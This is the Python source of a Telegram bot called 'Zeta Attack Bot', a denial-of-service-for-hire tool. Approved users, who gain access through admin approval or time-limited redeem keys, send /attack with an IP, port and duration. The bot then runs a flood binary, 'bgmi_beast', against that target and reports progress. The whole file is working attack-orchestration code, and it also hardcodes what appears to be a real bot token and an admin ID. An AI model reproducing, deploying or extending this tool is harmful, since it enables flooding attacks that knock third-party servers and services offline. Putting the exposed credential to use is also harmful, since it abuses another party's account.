#!/usr/bin/env python3
import os
import subprocess
import threading
import json
import random
import string
import time
import requests
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8402168828:AAHTB8REJZNq8cUvmEMcnaAgowk46uB8GkI')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 6465928598))

DATA_FILE = "zeta_users.json"
KEYS_FILE = "generated_keys.json"
BINARY_PATH = "./bgmi_beast"

active_attacks = {}
attack_lock = threading.Lock()

# Telegram API URL for sending messages without bot instance
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def load_json(filepath, default):
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            return json.load(f)
    return default

def save_json(filepath, data):
    with open(filepath, 'w') as f:
        json.dump(data, f, indent=4)

def is_admin(user_id):
    return user_id == ADMIN_ID

def is_approved(user_id):
    data = load_json(DATA_FILE, {})
    user_data = data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data.get('expiry', '2000-01-01'))
    return expiry > datetime.now()

def get_user_info(user_id):
    data = load_json(DATA_FILE, {})
    return data.get(str(user_id))

def generate_key(days):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    expiry = (datetime.now() + timedelta(days=days)).isoformat()
    keys_data = load_json(KEYS_FILE, {})
    keys_data[key] = expiry
    save_json(KEYS_FILE, keys_data)
    return key

def redeem_key(user_id, key):
    keys_data = load_json(KEYS_FILE, {})
    if key not in keys_data:
        return False, "❌ Invalid key"
    expiry = datetime.fromisoformat(keys_data[key])
    if expiry < datetime.now():
        del keys_data[key]
        save_json(KEYS_FILE, keys_data)
        return False, "❌ Key expired"
    
    data = load_json(DATA_FILE, {})
    data[str(user_id)] = {'approved_by': 'key', 'expiry': expiry.isoformat(), 'redeemed_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    del keys_data[key]
    save_json(KEYS_FILE, keys_data)
    return True, f"✅ Access granted until {expiry.strftime('%Y-%m-%d %H:%M:%S')}"

def format_progress_bar(percent, width=25):
    filled = int(width * percent / 100)
    bar = '█' * filled + '░' * (width - filled)
    return bar

def send_telegram_message(chat_id, text, parse_mode='HTML'):
    """Send message using direct Telegram API call"""
    try:
        url = f"{TELEGRAM_API_URL}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code != 200:
            print(f"Send failed: {response.text}")
        return response.ok
    except Exception as e:
        print(f"Failed to send message: {e}")
        return False

def run_attack(chat_id, target_ip, port, duration, method, threads, username):
    global active_attacks
    cmd = [BINARY_PATH, target_ip, str(port), str(duration), str(threads), method]
    
    start_time = time.time()
    target = f"{target_ip}:{port}"
    
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        with attack_lock:
            active_attacks[chat_id] = {
                'target': target,
                'start_time': start_time,
                'duration': duration,
                'process': process,
                'method': method,
                'threads': threads,
                'ip': target_ip,
                'port': port,
                'username': username
            }
        
        print(f"[ATTACK STARTED] {target} for {duration}s | User: {username}")
        
        # Send attack started notification
        start_msg = (
            f"🔥 <b>ATTACK STARTED</b> 🔥\n\n"
            f"👤 <b>User:</b> {username}\n"
            f"🎯 <b>Target:</b> <code>{target}</code>\n"
            f"⏱️ <b>Duration:</b> {duration} seconds\n"
            f"⚡ <b>Method:</b> UDP Flood ({threads} threads)\n"
            f"📅 <b>Started at:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>💀 Flood in progress...</i>"
        )
        send_telegram_message(chat_id, start_msg, 'HTML')
        
        # Wait for attack to complete
        process.wait()
        
        # Attack finished - remove from active attacks
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        
        # Calculate stats
        elapsed = time.time() - start_time
        
        # Send attack completion message as NEW message
        completion_msg = (
            f"✅ <b>ATTACK COMPLETED</b> ✅\n\n"
            f"👤 <b>User:</b> {username}\n"
            f"🎯 <b>Target:</b> <code>{target}</code>\n"
            f"⏱️ <b>Duration requested:</b> {duration} seconds\n"
            f"📊 <b>Actual duration:</b> {int(elapsed)} seconds\n"
            f"⚡ <b>Method:</b> UDP Flood ({threads} threads)\n"
            f"📅 <b>Completed at:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔥 <i>Attack finished successfully!</i>\n"
            f"📌 <i>Use /attack to start a new one</i>"
        )
        
        print(f"[ATTACK FINISHED] {target} - sending completion message to {username}")
        
        # Send NEW message (not edit)
        send_success = send_telegram_message(chat_id, completion_msg, 'HTML')
        if send_success:
            print(f"[SUCCESS] Completion message sent to {username}")
        else:
            print(f"[ERROR] Failed to send completion message")
                
    except Exception as e:
        print(f"Attack error: {e}")
        import traceback
        traceback.print_exc()
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]
        
        # Send error message
        error_msg = f"❌ <b>Attack failed</b>\n\nError: {str(e)[:200]}"
        send_telegram_message(chat_id, error_msg, 'HTML')

# ============================================================
# BOT COMMAND HANDLERS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = (
        f"🔥 <b>Welcome to Zeta Attack Bot</b> 🔥\n\n"
        f"👤 <b>User:</b> {user.first_name}\n"
        f"🆔 <b>ID:</b> <code>{user.id}</code>\n\n"
        f"⚡ Powered by Zo, created by Alpha\n"
        f"👑 <b>Owner:</b> @Yowai_mo_456\n\n"
        f"📖 <b>Commands:</b>\n"
        f"/help - Show all commands\n"
        f"/myinfo - Your access info\n"
        f"/status - View live attack progress\n"
        f"/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack\n"
        f"/redeem &lt;key&gt; - Redeem access key"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Not approved. Use /redeem")
        return
    
    msg = (
        "🔧 <b>Zeta Bot Commands</b> 🔧\n\n"
        "<b>User Commands:</b>\n"
        "/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch UDP flood\n"
        "/myinfo - Show your access expiry\n"
        "/status - Show live progress of running attacks\n"
        "/redeem &lt;key&gt; - Redeem access key\n"
        "/help - This message\n\n"
        "<b>Admin Commands:</b>\n"
        "/approve &lt;user_id&gt; &lt;days&gt; - Grant access\n"
        "/genkey &lt;days&gt; - Generate redeem key\n\n"
        "<b>Example:</b>\n"
        "<code>/attack 1.1.1.1 10001 60</code>\n\n"
        "<i>✅ You will receive an attack completion message automatically when finished!</i>"
    )
    await update.message.reply_text(msg, parse_mode='HTML')

async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    info = get_user_info(user_id)
    if not info:
        await update.message.reply_text("❌ No access found. Use /redeem or contact admin.")
        return
    
    expiry = datetime.fromisoformat(info['expiry'])
    remaining = expiry - datetime.now()
    days_left = remaining.days
    hours_left = remaining.seconds // 3600
    
    msg = f"📋 <b>Your Access Info</b>\n\n"
    msg += f"🆔 User ID: <code>{user_id}</code>\n"
    msg += f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
    msg += f"⏳ Time left: {days_left} days, {hours_left} hours\n"
    msg += f"✅ Status: <b>ACTIVE</b>"
    await update.message.reply_text(msg, parse_mode='HTML')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return
    
    with attack_lock:
        if not active_attacks:
            await update.message.reply_text("✅ No active attacks running.")
            return
        
        msg = "🔥 <b>LIVE ATTACK STATUS</b> 🔥\n\n"
        
        for cid, attack in active_attacks.items():
            elapsed = time.time() - attack['start_time']
            duration = attack['duration']
            percent = min(100, (elapsed / duration) * 100)
            remaining = max(0, duration - elapsed)
            
            progress_bar = format_progress_bar(percent, 25)
            remaining_min = int(remaining // 60)
            remaining_sec = int(remaining % 60)
            elapsed_min = int(elapsed // 60)
            elapsed_sec = int(elapsed % 60)
            
            if percent < 25:
                status_icon = "🔴 STARTING"
            elif percent < 50:
                status_icon = "🟠 FLOODING"
            elif percent < 75:
                status_icon = "🟡 INTENSE"
            elif percent < 100:
                status_icon = "🟢 MAXIMUM"
            else:
                status_icon = "✅ FINISHING"
            
            msg += f"👤 <b>User:</b> {attack.get('username', 'Unknown')}\n"
            msg += f"🎯 <b>Target:</b> <code>{attack['target']}</code>\n"
            msg += f"📊 <b>Progress:</b> <code>[{progress_bar}]</code> <b>{percent:.1f}%</b>\n"
            msg += f"⏱️ <b>Elapsed:</b> {elapsed_min}m {elapsed_sec}s | <b>Remaining:</b> {remaining_min}m {remaining_sec}s\n"
            msg += f"⚡ <b>Status:</b> {status_icon}\n"
            msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        msg += f"<i>🔄 Send /status again to refresh progress</i>"
        
        await update.message.reply_text(msg, parse_mode='HTML')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    username = update.effective_user.first_name or update.effective_user.username or str(user_id)
    
    if not is_approved(user_id) and not is_admin(user_id):
        await update.message.reply_text("❌ You are not approved. Contact admin or use /redeem.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("⚠️ Usage: <code>/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt;</code>\nExample: <code>/attack 1.1.1.1 10001 60</code>", parse_mode='HTML')
        return
    
    target_ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return
    
    if duration > 300:
        await update.message.reply_text("❌ Max duration is 300 seconds (5 minutes).")
        return
    
    if duration < 10:
        await update.message.reply_text("❌ Min duration is 10 seconds.")
        return
    
    # Check if already attacking
    with attack_lock:
        if chat_id in active_attacks:
            await update.message.reply_text("❌ You already have an active attack! Wait for it to finish.\n\nUse /status to check progress.")
            return
    
    # Confirm attack launch
    confirm_msg = (
        f"⚡ <b>Attack Confirmed</b> ⚡\n\n"
        f"🎯 Target: <code>{target_ip}:{port}</code>\n"
        f"⏱️ Duration: {duration} seconds\n"
        f"👤 User: {username}\n\n"
        f"<i>💀 You will receive STARTED and COMPLETED messages automatically!</i>"
    )
    await update.message.reply_text(confirm_msg, parse_mode='HTML')
    
    print(f"[DEBUG] Attack requested by {username} (ID: {user_id})")
    print(f"[DEBUG] Target: {target_ip}:{port} for {duration}s")
    
    # Launch attack thread (without start_msg_id since we send separate messages now)
    thread = threading.Thread(
        target=run_attack,
        args=(chat_id, target_ip, port, duration, "udp", 16, username),
        daemon=True
    )
    thread.start()

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/redeem &lt;key&gt;</code>", parse_mode='HTML')
        return
    
    key = args[0]
    success, msg = redeem_key(user_id, key)
    await update.message.reply_text(msg, parse_mode='HTML')

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: <code>/approve &lt;user_id&gt; &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id or days.")
        return
    
    expiry = datetime.now() + timedelta(days=days)
    data = load_json(DATA_FILE, {})
    data[str(target_id)] = {'approved_by': 'admin', 'expiry': expiry.isoformat(), 'approved_at': datetime.now().isoformat()}
    save_json(DATA_FILE, data)
    
    await update.message.reply_text(f"✅ User <code>{target_id}</code> approved for {days} days.", parse_mode='HTML')
    
    # Notify the approved user
    send_telegram_message(target_id, f"✅ <b>You have been approved by Admin!</b>\n\n📅 Access until: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n🔥 Use /attack to start flooding.", 'HTML')

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Admin only.")
        return
    
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: <code>/genkey &lt;days&gt;</code>", parse_mode='HTML')
        return
    
    try:
        days = int(args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid days.")
        return
    
    key = generate_key(days)
    await update.message.reply_text(f"🔑 <b>Generated Key</b>\n\n<code>{key}</code>\n\nValid for {days} days.\nUser can redeem with: <code>/redeem {key}</code>", parse_mode='HTML')

# ============================================================
# MAIN
# ============================================================
def main():
    print("🔥 Zo Bot is starting...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"📁 Data file: {DATA_FILE}")
    print(f"🔑 Keys file: {KEYS_FILE}")
    
    if not os.path.exists(BINARY_PATH):
        print(f"⚠️ Warning: Binary not found at {BINARY_PATH}")
        print("Make sure bgmi_beast is compiled and executable")
        print("Run: chmod +x bgmi_beast")
    else:
        print(f"✅ Binary found at {BINARY_PATH}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("approve", approve))
    app.add_handler(CommandHandler("genkey", genkey))
    
    print("\n✅ Bot is running!")
    print("📊 Features:")
    print("   - ✅ Separate STARTED and COMPLETED messages sent to Telegram")
    print("   - 📊 /status shows live progress")
    print("   - 🔔 Automatic notifications on attack start/finish")
    print("\n🔥 Ready for commands, Alpha!\n")
    
    app.run_polling()

if __name__ == "__main__":
    main()
